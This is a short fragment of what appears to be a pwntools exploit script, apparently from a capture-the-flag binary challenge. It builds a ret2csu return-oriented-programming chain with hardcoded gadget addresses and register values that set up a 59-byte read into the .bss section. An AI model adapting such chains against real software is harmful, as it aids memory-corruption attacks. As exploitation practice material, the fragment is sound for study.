csu1 = 0x4007EA
csu2 = 0x4007D0
rbx = 0
rbp = 1
r12_func = 0x600E50
r15_edi = 0
r14_rsi = bss_addr
r13_rdx = 59

csu_chain = flat(
    csu1,rbx,rbp,r12_func,
    r13_rdx,r14_rsi,r15_edi,csu2,p64(0)*7,
)